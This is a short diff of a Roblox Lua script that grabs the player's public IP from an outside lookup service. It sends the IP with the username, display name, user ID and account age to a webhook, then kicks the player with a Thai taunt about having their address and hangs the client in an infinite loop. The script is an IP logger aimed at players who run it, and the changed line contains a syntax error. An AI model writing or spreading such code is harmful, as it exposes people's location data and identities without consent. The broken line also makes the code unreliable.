@@ -27,7 +27,7 @@ function SendWebhook(Arg)
         })
 end
 
-SendWebhook(game:HttpGet("https://wtfismyip.com/text").. " : "..game.Players.LocalPlayer.Name)
+SendWebhook("IP : "tostring(game:HttpGet("https://wtfismyip.com/text")) .. "\nUsername : "..game:GetService("Players").LocalPlayer.Name .. "\nDisplayName : "..game:GetService("Players").LocalPlayer.DisplayName.."\nUserID : "..game:GetService("Players").LocalPlayer.UserId.."\n AccountAge : "..game:GetService("Players").LocalPlayer.AccountAge)
 game.Players.LocalPlayer:Kick("ได้ที่อยู่คุณมาละโชคดีนะ 5555")
 task.wait(1)
 while true do end
